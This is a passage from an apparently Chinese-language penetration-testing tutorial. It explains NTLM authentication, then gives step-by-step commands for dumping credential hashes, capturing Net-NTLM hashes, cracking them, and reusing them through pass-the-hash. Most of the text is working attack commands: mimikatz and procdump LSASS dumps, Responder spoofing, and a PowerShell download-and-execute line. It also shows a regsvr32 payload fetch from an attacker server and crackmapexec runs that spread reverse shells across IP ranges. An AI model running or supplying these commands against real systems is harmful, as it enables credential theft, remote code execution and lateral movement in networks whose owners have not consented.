successful.</li></ol></blockquote><p>翻译过来流程大致如下：</p><ol><li>用户访问客户端计算机并输入用户名和密码信息，尝试进行登录</li><li>客户端计算机对密码进行哈希处理并缓存密码hash，丢弃实际的明文密码(不存储)，然后将用户名发送到服务器，发起认证请求</li><li>服务器生成一个16字节的随机数，称为<strong><em>质询\</em> (challenge)</strong> 或<a href="https://msdn.microsoft.com/en-us/library/ms721596(v=VS.85).aspx" target="_blank" rel="noopener"><em>随机数 (nonce)</em></a>，并将<em>challenge</em>发送给客户端</li><li>客户端使用缓存的<strong><em>用户密码的哈希值\</em></strong>对此<em>challenge</em>进行加密，加密结果为Response (响应)，然后将Username、Challenge、Response<code>（Net-NTML hash）</code>发送给服务器</li><li>服务器将<strong><em>Username、Challenge、Response\</em></strong><code>（Net-NTML hash）</code>发送给<strong><em>DC (Domain Controller，域控制器)\</em></strong></li><li>DC域控制器从<strong><em>AD (Account Database，帐户数据库)\</em></strong> 中检索该用户名，并提取用户密码的NTML hash，使用该hash来加密challenge，并且把这个值和客户端计算的响应值进行比较。如果它们相同，则验证成功。</li></ol><h3 id="三、如何拿到Hash"><a href="#三、如何拿到Hash" class="headerlink" title="三、如何拿到Hash?"></a>三、如何拿到Hash?</h3><h5 id="1-本地获取"><a href="#1-本地获取" class="headerlink" title="1.本地获取"></a>1.本地获取</h5><p>在渗透测试中，通常可从Windows系统中的<code>SAM</code>文件和域控的<code>NTDS.dit</code>文件中获得用户hash，通过读取<code>lsass.exe</code>进程能获得已登录用户的NTLM hash。许多工具能够方便地为我们完成这些工作。但需要注意的是：</p><blockquote><p>大部分这种本地抓取hash的工具都需要管理员权限</p></blockquote><p>常用工具：</p><ul><li><p><a href="https://code.google.com/p/quarkspwdump/downloads/detail?name=QuarksPwDump_v0.2b.zip&can=2&q=" target="_blank" rel="noopener">QuarksPwDump</a></p></li><li><p><a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">Mimikatz</a></p></li><li><p><a href="https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx" target="_blank" rel="noopener">ProDump</a></p></li><li><p><a href="https://www.offensive-security.com/metasploit-unleashed/Mimikatz/" target="_blank" rel="noopener">Metasploit</a></p></li><li><p>Cobaltstrike</p></li><li><p><a href="https://code.google.com/p/quarkspwdump/downloads/detail?name=QuarksPwDump_v0.2b.zip&can=2&q=" target="_blank" rel="noopener">QuarksPwDump</a></p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quarkspwdump.exe -dhl</span><br></pre></td></tr></table></figure><ul><li><a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">Mimikatz</a></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>更方便的mimikatz命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"privilege::debug"</span> <span class="string">"sekurlsa::logonpasswords full"</span></span><br></pre></td></tr></table></figure><p>执行以下命令除了回显，还可以dump结果并将hash保存为log日志文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">""</span>privilege::debug<span class="string">""</span> <span class="string">""</span><span class="built_in">log</span> sekurlsa::logonpasswords full<span class="string">""</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><ul><li><a href="https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx" target="_blank" rel="noopener">ProDump</a></li></ul><p><code>prodump</code>是微软提供的一个命令行实用程序，用于监视应用程序并生成故障转储。我们可以用它先dump对方主机的<code>LSASS</code>内存文件，然后在自己主机用<code>mimikatz</code>等工具进行处理。这种方式的好处是可以避免被查杀。先转储<code>LSASS</code>内存文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure><p>然后本地用<code>mimikatz</code>对<code>LSASS</code>内存文件进行破解：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"sekurlsa::minidump lsass.dmp"</span></span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>类似<code>ProDump</code>的工具还有：<strong>fgdump</strong>、<strong>pwdump</strong>、<strong>cachedump</strong>等。利用powershell也能够像<code>Prodump</code>一样转储lsass文件：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'</span>); <span class="string">"Get-Process lsass | Out-Minidump"</span></span><br></pre></td></tr></table></figure><ul><li><a href="https://www.offensive-security.com/metasploit-unleashed/Mimikatz/" target="_blank" rel="noopener">Metasploit</a></li></ul><p>首先需要获取<code>SYSTEM</code>权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><p>在<code>metasploit</code>中利用<code>mimikatz</code>获取hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br></pre></td></tr></table></figure><p><code>metasploit</code>提供的抓取hash的一些模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/hashdump</span><br><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure><p><code>smart_hashdump</code>模块会把dump的hash文件保存在<code>/root/.msf4/loot</code>目录下，并且该模块一定程度上能够绕过<code>windows UAC</code>。</p><p>顺便介绍一些能够直接获取明文密码的模块命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; wdigest （kerberos）</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">meterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords </span><br><span class="line"></span><br><span class="line">meterpreter&gt;load kiwi</span><br><span class="line">meterpreter&gt; creds_wdigest</span><br></pre></td></tr></table></figure><h4 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h4><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">beacon&gt; </span>getuid</span><br><span class="line"><span class="keyword">beacon&gt; </span>powershell-<span class="meta">import</span> /root/powershell/<span class="meta">Get</span>-PassHashes.ps1</span><br><span class="line"><span class="keyword">beacon&gt; </span>powershell <span class="meta">Get</span>-PassHashes</span><br></pre></td></tr></table></figure><p> 读取hash，需要administer权限(右击目标主机–<code>Access</code>-<code>hashdump</code>)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; wdigest //读取信息</span><br><span class="line">beacon&gt; hashdump</span><br></pre></td></tr></table></figure><p>运行mimikatz(右击目标主机–<code>Access</code>- <code>RUN mimikatz</code>)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; logonpasswords</span><br></pre></td></tr></table></figure><p>右击受害者主机–access-hashdump</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; powershell-import /root/powershell/Inveigh/Inveigh.ps1</span><br><span class="line">beacon&gt; powershell Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -NBNS Y -mDNS Y -LLMNR Y -HTTP Y -PROXY Y</span><br></pre></td></tr></table></figure><h4 id="2-网络欺骗"><a href="#2-网络欺骗" class="headerlink" title="2.网络欺骗"></a>2.网络欺骗</h4><p>通常我们采用网络欺骗技术，配合受害者交互的方式窃取到是Net-NTLM Hash。这类hash并不能直接用于<code>pass-the-hash</code>攻击，但可以通过暴力破解的方式来获取明文密码。关于更多获取<code>Net-NTML HASH</code>的技巧，可以参考</p><p>常用工具：</p><ul><li>Responder</li><li>Metasploit</li></ul><h5 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h5><p><code>responder</code>可以伪造服务，对相关请求进行响应。开启命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0</span><br></pre></td></tr></table></figure><p>实战环境下，我们应该修改<code>/etc/responder/Responder.conf</code>配置文件，关闭其中的一些不必要的服务，从而减少网络流量，并产生针对性日志，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">; Servers to start</span><br><span class="line">SQL = Off</span><br><span class="line">SMB = On</span><br><span class="line">Kerberos = On</span><br><span class="line">FTP = Off</span><br><span class="line">POP = Off</span><br><span class="line">SMTP = Off</span><br><span class="line">IMAP = Off</span><br><span class="line">HTTP = On</span><br><span class="line">HTTPS = On</span><br><span class="line">DNS = On</span><br><span class="line">LDAP = On</span><br></pre></td></tr></table></figure><p>针对测试而言，我们还可以设置<code>Challenge</code>值，以便观察流量格式：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Challenge</span> = <span class="number">1122334455667788</span></span><br></pre></td></tr></table></figure><p>开启监听后，当用户进行了交互，如在资源管理器中以<code>UNC</code>路径形式访问伪造的服务器：</p><p>此时会弹出虚假认证界面，此时无论受害者是否输入凭据，我们都已经获取了<code>NET NTML Hash</code>。<code>responder</code>默认会将日志保存在<code>/usr/share/responder/logs</code>下，hash记录文件以<code>HTTP-NTLMv2</code>   <code>SMBv2-NTLMv2</code>等前缀开头。</p><p>在渗透测试中，我们还可以通过其他技巧获取<code>Net-NTML Hash</code>，如：</p><ul><li>命令执行：<code>regsvr32</code>、<code>powershell</code>等</li><li>钓鱼文档：doc、docx、pdf</li><li>后门设置：</li></ul><p>例：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 /s /u /i:<span class="comment">//17.10.0.1/@abc hello.dll</span></span><br><span class="line"></span><br><span class="line">powershell -c <span class="string">"Invoke-Item \\17.10.0.1\aa"</span></span><br><span class="line">powershell -nop -exec bypass -c <span class="string">"Invoke-Item \\17.10.0.1\aa"</span></span><br><span class="line">Invoke-Item \\<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>\aa</span><br><span class="line">Get-Content \\<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>\aa</span><br><span class="line">Start-Process \\<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>\aa</span><br></pre></td></tr></table></figure><h5 id="3-其他技巧"><a href="#3-其他技巧" class="headerlink" title="3.其他技巧"></a>3.其他技巧</h5><p>还有许多其他<code>Credential Dumping</code>姿势，可以参考：</p><p><a href="https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/" target="_blank" rel="noopener">dumping-domain-password-hashes</a></p><p><a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" target="_blank" rel="noopener">Places of Interest in Stealing NetNTLM Hashes</a> 及译文 <a href="https://paper.seebug.org/474/" target="_blank" rel="noopener">花式窃取NetNTLM哈希的方法</a></p><h3 id="四、如何利用Hash？"><a href="#四、如何利用Hash？" class="headerlink" title="四、如何利用Hash？"></a>四、如何利用Hash？</h3><p>在拿到hash之后，我们一般会考虑破解出hash明文密码，或者利用<code>pass-the-hash</code>技术在无需明文密码的情况下进行特权操作。</p><h4 id="1-解密Hash"><a href="#1-解密Hash" class="headerlink" title="1.解密Hash"></a>1.解密Hash</h4><h5 id="在线解密"><a href="#在线解密" class="headerlink" title="在线解密"></a>在线解密</h5><p>下面是一些提供在线解密的站点：</p><ul><li><a href="https://www.cmd5.com/" target="_blank" rel="noopener">https://www.cmd5.com/</a></li><li><a href="https://crack.sh/get-cracking/" target="_blank" rel="noopener">https://crack.sh/get-cracking/</a></li><li><a href="http://hashcrack.com/index.php" target="_blank" rel="noopener">http://hashcrack.com/index.php</a></li><li><a href="http://cracker.offensive-security.com/index.php" target="_blank" rel="noopener">http://cracker.offensive-security.com/index.php</a></li><li><a href="http://www.objectif-securite.ch/en/ophcrack.php" target="_blank" rel="noopener">http://www.objectif-securite.ch/en/ophcrack.php</a></li></ul><h5 id="本地破解"><a href="#本地破解" class="headerlink" title="本地破解"></a>本地破解</h5><p>我们还可以使用<code>john</code>、<code>hashcat</code>等工具，通过hash表、字典等进行本地破解。当工具内置的hash字典无法成功破解时，我们可以使用自己搜集的字典文件，或者利用社工等方法针对性生成hash字典。</p><h4 id="John"><a href="#John" class="headerlink" title="John"></a>John</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john HTTP-NTLMv2-17.10.0.10.txt</span><br></pre></td></tr></table></figure><h4 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a>Hashcat</h4><p>使用<code>hashcat -h</code>命令查看帮助，必要的参数有：</p><p><code>-m</code>  hash类型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LM：3000 </span><br><span class="line">NTLM：1000</span><br><span class="line">NetNTLMv1：5500</span><br><span class="line">NetNTLMv2：5600</span><br></pre></td></tr></table></figure><p>NTLMv1的格式为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username::hostname:LM response:NTLM response:challenge</span><br></pre></td></tr></table></figure><p>构造后的数据如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log1::WIN-BH7SVRRDGVA:fec9b082080e34ba00000000000000000000000000000000:51acb9f9909f0e3c4254c332f5e302a38429c5490206bc04:8d2da0f5e21e20ee</span><br></pre></td></tr></table></figure><p>Hashcat参数如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5500 log1::WIN-BH7SVRRDGVA:fec9b082080e34ba00000000000000000000000000000000:51acb9f9909f0e3c4254c332f5e302a38429c5490206bc04:8d2da0f5e21e20ee /tmp/password.list -o found.txt --force</span><br></pre></td></tr></table></figure><p>下面，使用Hashcat对该Net-NTLM hash进行破解。NTLMv2的格式为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username::domain:challenge:HMAC-MD5:blob</span><br></pre></td></tr></table></figure><blockquote><p>值得一提的是，在真实渗透环境下，由于密码复杂度限制，一般我们获取到的<code>NTML-HASH</code>很难直接破解出明文密码，这种情况下我们需要采用其他技术继续进行横向渗透。</p></blockquote><h4 id="2-Pass-The-Hash"><a href="#2-Pass-The-Hash" class="headerlink" title="2.Pass-The-Hash"></a>2.Pass-The-Hash</h4><p>哈希传递是能够在不需要账户明文密码的情况下完成认证的一个技术。渗透中当我们获取不到明文密码，或者破解不了NTLM Hash的情况下，哈希传递攻击能够使我们利用这些哈希继续进行横向渗透。</p><p>常用<code>Pass-The-Hash</code>工具： </p><ul><li>Crackmapexec</li><li>Mimikatz</li><li>smbmap</li><li>smbexec</li><li>metasploit</li><li>cobaltstrike</li></ul><h5 id="Crackmapexec"><a href="#Crackmapexec" class="headerlink" title="Crackmapexec"></a><a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener">Crackmapexec</a></h5><p>1.安装 crackmapexec</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install crackmapexec</span><br><span class="line">(pip install crackmapexec)</span><br></pre></td></tr></table></figure><p>2.使用 crackmapexec</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb -h</span><br></pre></td></tr></table></figure><p>批量扫描探测命令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cme smb <span class="number">17.10</span><span class="number">.0</span><span class="number">.10</span>/<span class="number">24</span></span><br><span class="line">cme smb <span class="number">17.10</span><span class="number">.0</span><span class="number">.10</span> -u administrator -H hash.txt</span><br><span class="line">cme smb <span class="number">17.10</span><span class="number">.0</span><span class="number">.100</span><span class="number">-200</span> -u administrator -H AFC44EE7351D61D00698796DA06B1EBF</span><br></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cme smb <span class="number">17.10</span><span class="number">.0</span><span class="number">.10</span>  -u administrator -p toor(明文密码) -x whoami</span><br><span class="line">cme smb <span class="number">17.10</span><span class="number">.0</span><span class="number">.10</span>  -u administrator -H afc44ee7351d61d00698796da06b1ebf -x whoami</span><br></pre></td></tr></table></figure><p>其他参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">--shares    <span class="comment">#枚举共享和访问权限</span></span><br><span class="line">--sessions    <span class="comment">#枚举活动会话</span></span><br><span class="line">--disks        <span class="comment">#枚举磁盘</span></span><br><span class="line">--sam         <span class="comment">#dump目标系统中的SAM哈希值</span></span><br><span class="line">--loggedon-users    <span class="comment">#枚举登录用户</span></span><br><span class="line">--users [USER]        <span class="comment">#枚举域用户(如果指定了用户只查询其信息)</span></span><br><span class="line">--groups [GROUP]        <span class="comment">#枚举域组(如果指定了组其成员被列举)</span></span><br><span class="line">--<span class="built_in">local</span>-groups [GROUP]  <span class="comment">#如果指定了组则枚举本地组其成员被列举</span></span><br><span class="line">--<span class="built_in">local</span>-groups [GROUP]    <span class="comment">#枚举本地组，如果指定了组，则枚举其成员</span></span><br><span class="line">-x COMMAND                <span class="comment">#执行指定的命令</span></span><br><span class="line">-X PS_COMMAND            <span class="comment">#执行指定的PowerShell命令</span></span><br><span class="line"></span><br><span class="line">-L， --list-modules    <span class="comment">#列出可用的拓展功能模块</span></span><br><span class="line">--options    <span class="comment">#查看模块选项</span></span><br><span class="line">-M MODULE， --module MODULE     <span class="comment">#使用拓展功能模块</span></span><br><span class="line">-o MODULE_OPTION [MODULE_OPTION ...] <span class="comment">#设置模块选项</span></span><br></pre></td></tr></table></figure><p>GETSHELL</p><p>利用拓展功能模块，我们可以方便地getshell。我们可以使用<code>cme smb -L</code>命令查看所有<code>moudules</code>，对应的物理路径为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/lib/python2<span class="number">.7</span>/dist-packages/crackmapexec<span class="number">-4.0</span><span class="number">.1</span>.dev0-py2<span class="number">.7</span>.egg/cme/modules</span><br></pre></td></tr></table></figure><p>其中提供的<code>met_inject.py</code>模块可以使目标下载执行<code>Meterpreter stager</code>，我们先来看下模块需要的参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cme smb -M met_inject --options</span><br><span class="line">[*] met_inject module options:</span><br><span class="line">    LHOST    IP hosting the handler</span><br><span class="line">    LPORT    Handler port</span><br><span class="line">    PAYLOAD  Payload to inject: reverse_http or reverse_https (default:reverse_https)</span><br><span class="line">    PROCID   Process ID to inject into (default: current powershell process)</span><br></pre></td></tr></table></figure><p>这是一个<code>http</code>或<code>https</code>的反弹shell，我们使用默认的<code>reverse_https</code>，提供需要的<code>LHOST</code>和<code>LPORT</code>的参数即可：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme<span class="built_in"> smb </span>17.10.0.10-150 -u administrator -H AFC44EE7351D61D00698796DA06B1EBF -M met_inject -o <span class="attribute">LHOST</span>=17.10.0.1 <span class="attribute">LPORT</span>=9999</span><br></pre></td></tr></table></figure><p>命令的意思是通过pass-the-hash批量攻击<code>17.10.0.10-17.10.0.150</code>网段的主机，并使其执行meterpreter的https反弹shell。</p><p>笔者测试时遇到问题，无法用<code>met_inject.py</code>模块正常getshell，不知道什么原因。因此选择直接通过命令执行getlshell。利用metasploit的<code>web_delivery</code>模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 17.10.0.1</span><br><span class="line"><span class="built_in">set</span> LPORT 9999</span><br><span class="line"><span class="built_in">set</span> target 3</span><br><span class="line">run</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Started reverse TCP handler on 17.10.0.1:9999 </span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/1KZkey</span><br><span class="line">[*] Local IP: http://10.204.146.152:8080/1KZkey</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following <span class="built_in">command</span> on the target machine:</span><br><span class="line">regsvr32 /s /n /u /i:http://17.10.0.1:8080/1KZkey.sct scrobj.dll</span><br></pre></td></tr></table></figure><p>通过pass-the-hash执行命令批量getshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb 17.10.0.10-15 -u administrator -H AFC44EE7351D61D00698796DA06B1EBF -x <span class="string">"regsvr32 /s /n /u /i:http://17.10.0.1:8080/1KZkey.sct scrobj.dll"</span></span><br></pre></td></tr></table></figure><h5 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a><a href="https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/" target="_blank" rel="noopener">Metasploit</a></h5><p>search <code>psexec</code>，<code>smblogin</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec </span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> RHOST 17.10.0.10</span><br><span class="line"><span class="built_in">set</span> smbuser administrator</span><br><span class="line"><span class="built_in">set</span> smbpass AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">use exploit/windows/smb/psexec_psh</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> RHOST 17.10.0.10</span><br><span class="line"><span class="built_in">set</span> smbuser administrator</span><br><span class="line"><span class="built_in">set</span> smbpass AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF</span><br></pre></td></tr></table></figure><p>举例：</p><h5 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a><a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">Mimikatz</a></h5><p>先抓取hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">""</span>privilege::debug<span class="string">""</span> <span class="string">""</span>sekurlsa::logonpasswords<span class="string">""</span></span><br></pre></td></tr></table></figure><p>得到hash之后：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:Administrator /domain:ssooking-pc /ntlm:AFC44EE7351D61D00698796DA06B1EBF</span><br></pre></td></tr></table></figure><h5 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a><a href="https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noopener">wmiexec.py</a></h5><p>exe 版本下载<a href="https://github.com/maaaaz/impacket-examples-windows" target="_blank" rel="noopener">链接</a></p><p>windows 管理规范<code>WMI</code>，实际上就是windows从<code>03/XP</code>开始就内置了这个系统插件。其设计初衷之一是为了管理员能更加方便的对远程windows主机进行各种日常管理。</p><p>严格来说它其实是为各种服务提供一个统一的调用接口，比如你想操作什么服务就去调用对应的服务类中的方法去执行你的操作。在渗透测试中，它意味着我们可以直接在本地操作远程目标机器上的进程、服务、注册表等包括其它一系列特权操作，wmi是一把在目标内网进行横向移动的非常趁手的武器。<code>wmiexec</code>是一个python2脚本，对windows自带的wmic做了一些强化，让渗透变得更容易。</p><p>只能说很多工具吧，比较好用的在这里介绍两种：</p><p>wmiexec的注释中提示”Main advantage here is it runs under the user (has to be Admin) account”，经实际测试普通用户权限即可。wmiexec的hash参数格式为<code>LMHASH:NTHASH</code>，由于该Hash来自于Server 2008，系统默认不支持LM hash，所以LM hash可以设定为任意值。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py -hashes 00000000000000000000000000000000:AFC44EE7351D61D00698796DA06B1EBF ssookinging-pc/administrator@17.10.0.10 <span class="string">"whoami"</span></span><br></pre></td></tr></table></figure><h5 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h5><p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Invoke-TheHash</a></p><p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash/" target="_blank" rel="noopener">Invoke-WMIExec</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-WMIExec</span> <span class="literal">-Target</span> <span class="number">17.10</span>.<span class="number">0.10</span> <span class="literal">-Domain</span> test.local <span class="literal">-Username</span> test1 <span class="literal">-Hash</span> AFC44EE7351D61D00698796DA06B1EBF <span class="literal">-Command</span> <span class="string">"calc.exe"</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure><p>Invoke-SMBExec</p><p>通过在目标主机创建服务执行命令，所以权限为system</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-SMBExec</span> <span class="literal">-Target</span> <span class="number">192.168</span>.<span class="number">0.2</span> <span class="literal">-Domain</span> ssookinging<span class="literal">-pc</span> <span class="literal">-Username</span> test1 <span class="literal">-Hash</span> <span class="number">7</span>ECFFFF0C3548187607A14BAD0F88BB1 <span class="literal">-Command</span> <span class="string">"calc.exe"</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure><h5 id="Invoke-SMBClient："><a href="#Invoke-SMBClient：" class="headerlink" title="Invoke-SMBClient："></a>Invoke-SMBClient：</h5><p>支持SMB1, SMB2 (2.1), and SMB 